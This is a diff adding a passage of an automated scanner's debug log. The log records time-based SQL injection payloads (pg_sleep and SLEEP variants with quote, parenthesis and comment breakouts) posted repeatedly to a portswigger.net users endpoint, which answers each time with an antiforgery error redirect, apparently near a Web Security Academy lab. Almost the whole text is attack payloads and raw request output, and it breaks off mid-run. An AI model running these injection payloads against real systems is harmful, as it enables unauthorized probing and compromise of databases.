@@ -4002,3 +4002,1004 @@ Response Code: 200
 2024-08-16 21:57:32,064 - INFO - [21:57:32] Payload testing: ' or pg_sleep(5)--
 2024-08-16 21:57:32,072 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
 2024-08-16 21:57:33,700 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 21:57:34,258 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 21:57:34,276 - INFO - [21:57:34] Payload testing: 1) or pg_sleep(5)--
+2024-08-16 21:57:34,287 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 21:57:36,064 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 21:57:36,437 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 21:57:41,214 - INFO - [21:57:41] Payload testing: 1) or pg_sleep(5)--
+2024-08-16 21:57:41,224 - INFO - [!] Recheck payload: 1) or pg_sleep(10)--
+2024-08-16 21:57:41,227 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 21:57:42,924 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 21:57:43,514 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 21:57:43,538 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 21:57:45,304 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 21:57:45,920 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 21:57:45,933 - INFO - [21:57:45] Payload testing: 1) or pg_sleep(5)--
+2024-08-16 21:57:45,940 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 21:57:47,588 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 21:57:48,143 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 21:57:48,165 - INFO - [21:57:48] Payload testing: ") or pg_sleep(5)--
+2024-08-16 21:57:48,180 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 21:57:49,826 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 21:57:50,401 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 21:57:50,414 - INFO - [21:57:50] Payload testing: ") or pg_sleep(5)--
+2024-08-16 21:57:50,434 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 21:57:52,285 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 21:57:52,926 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 21:57:52,940 - INFO - [21:57:52] Payload testing: ") or pg_sleep(5)--
+2024-08-16 21:57:52,955 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 21:57:54,607 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 21:57:55,176 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 21:57:55,191 - INFO - [21:57:55] Payload testing: ') or pg_sleep(5)--
+2024-08-16 21:57:55,201 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 21:57:56,839 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 21:57:57,434 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 21:57:57,448 - INFO - [21:57:57] Payload testing: ') or pg_sleep(5)--
+2024-08-16 21:57:57,462 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 21:57:59,137 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 21:57:59,707 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 21:58:00,190 - INFO - [21:58:00] Payload testing: ') or pg_sleep(5)--
+2024-08-16 21:58:00,202 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 21:58:02,030 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 21:58:02,401 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 21:58:02,837 - INFO - [21:58:02] Payload testing: 1)) or pg_sleep(5)--
+2024-08-16 21:58:02,849 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 21:58:04,545 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 21:58:04,875 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 21:58:05,143 - INFO - [21:58:05] Payload testing: 1)) or pg_sleep(5)--
+2024-08-16 21:58:05,154 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 21:58:06,941 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 21:58:07,506 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 21:58:07,535 - INFO - [21:58:07] Payload testing: 1)) or pg_sleep(5)--
+2024-08-16 21:58:07,545 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 21:58:11,633 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 21:58:12,371 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 21:58:12,393 - INFO - [21:58:12] Payload testing: ")) or pg_sleep(5)--
+2024-08-16 21:58:12,406 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 21:58:14,241 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 21:58:14,907 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 21:58:14,941 - INFO - [21:58:14] Payload testing: ")) or pg_sleep(5)--
+2024-08-16 21:58:14,952 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 21:58:16,950 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 21:58:17,645 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 21:58:17,660 - INFO - [21:58:17] Payload testing: ")) or pg_sleep(5)--
+2024-08-16 21:58:17,671 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 21:58:19,463 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 21:58:20,088 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 21:58:20,131 - INFO - [21:58:20] Payload testing: ')) or pg_sleep(5)--
+2024-08-16 21:58:20,147 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 21:58:22,179 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 21:58:22,802 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 21:58:22,822 - INFO - [21:58:22] Payload testing: ')) or pg_sleep(5)--
+2024-08-16 21:58:22,835 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 21:58:24,668 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 21:58:25,235 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 21:58:25,253 - INFO - [21:58:25] Payload testing: ')) or pg_sleep(5)--
+2024-08-16 21:58:25,266 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 21:58:27,090 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 21:58:27,740 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 21:58:27,766 - INFO - [21:58:27] Payload testing: AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
+2024-08-16 21:58:27,780 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 21:58:29,596 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 21:58:30,209 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 21:58:30,230 - INFO - [21:58:30] Payload testing: AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
+2024-08-16 21:58:30,243 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 21:58:32,113 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 21:58:32,420 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 21:58:32,779 - INFO - [21:58:32] Payload testing: AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
+2024-08-16 21:58:32,788 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 21:58:34,539 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 21:58:35,169 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 21:58:35,202 - INFO - [21:58:35] Payload testing: AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='
+2024-08-16 21:58:35,218 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 21:58:37,066 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 21:58:37,700 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 21:58:37,719 - INFO - [21:58:37] Payload testing: AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='
+2024-08-16 21:58:37,729 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 21:58:39,561 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 21:58:39,894 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 21:58:40,195 - INFO - [21:58:40] Payload testing: AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='
+2024-08-16 21:58:40,212 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 21:58:41,977 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 21:58:42,559 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 21:58:42,568 - INFO - [21:58:42] Payload testing: AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
+2024-08-16 21:58:42,577 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 21:58:44,255 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 21:58:44,569 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 21:58:44,878 - INFO - [21:58:44] Payload testing: AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
+2024-08-16 21:58:44,889 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 21:58:46,632 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 21:58:47,262 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 21:58:47,280 - INFO - [21:58:47] Payload testing: AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
+2024-08-16 21:58:47,288 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 21:58:49,010 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 21:58:49,572 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 21:58:49,589 - INFO - [21:58:49] Payload testing: AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--
+2024-08-16 21:58:49,610 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 21:58:51,282 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 21:58:51,934 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 21:58:51,953 - INFO - [21:58:51] Payload testing: AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--
+2024-08-16 21:58:51,962 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 21:58:53,606 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 21:58:54,338 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 21:58:54,932 - INFO - [21:58:54] Payload testing: AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--
+2024-08-16 21:58:54,948 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 21:58:56,792 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 21:58:57,424 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 21:58:57,440 - INFO - [21:58:57] Payload testing: AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#
+2024-08-16 21:58:57,449 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 21:58:59,087 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 21:58:59,642 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 21:58:59,654 - INFO - [21:58:59] Payload testing: AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#
+2024-08-16 21:58:59,664 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 21:59:01,377 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 21:59:01,994 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 21:59:02,016 - INFO - [21:59:02] Payload testing: AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#
+2024-08-16 21:59:02,028 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 21:59:03,784 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 21:59:04,416 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 21:59:04,436 - INFO - [21:59:04] Payload testing: SLEEP(5)#
+2024-08-16 21:59:04,449 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 21:59:06,158 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 21:59:06,561 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 21:59:06,780 - INFO - [21:59:06] Payload testing: SLEEP(5)#
+2024-08-16 21:59:06,794 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 21:59:08,522 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 21:59:09,146 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 21:59:09,157 - INFO - [21:59:09] Payload testing: SLEEP(5)#
+2024-08-16 21:59:09,169 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 21:59:10,855 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 21:59:11,474 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 21:59:11,496 - INFO - [21:59:11] Payload testing: SLEEP(5)--
+2024-08-16 21:59:11,511 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 21:59:13,247 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 21:59:13,912 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 21:59:13,923 - INFO - [21:59:13] Payload testing: SLEEP(5)--
+2024-08-16 21:59:13,934 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 21:59:15,628 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 21:59:16,221 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 21:59:16,283 - INFO - [21:59:16] Payload testing: SLEEP(5)--
+2024-08-16 21:59:16,293 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 21:59:17,874 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 21:59:18,433 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 21:59:18,461 - INFO - [21:59:18] Payload testing: SLEEP(5)="
+2024-08-16 21:59:18,473 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 21:59:20,227 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 21:59:20,851 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 21:59:20,867 - INFO - [21:59:20] Payload testing: SLEEP(5)="
+2024-08-16 21:59:20,877 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 21:59:22,523 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 21:59:23,138 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 21:59:23,152 - INFO - [21:59:23] Payload testing: SLEEP(5)="
+2024-08-16 21:59:23,160 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 21:59:24,888 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 21:59:25,473 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 21:59:25,505 - INFO - [21:59:25] Payload testing: SLEEP(5)='
+2024-08-16 21:59:25,516 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 21:59:27,171 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 21:59:27,734 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 21:59:27,753 - INFO - [21:59:27] Payload testing: SLEEP(5)='
+2024-08-16 21:59:27,765 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 21:59:29,450 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 21:59:29,779 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 21:59:30,056 - INFO - [21:59:30] Payload testing: SLEEP(5)='
+2024-08-16 21:59:30,068 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
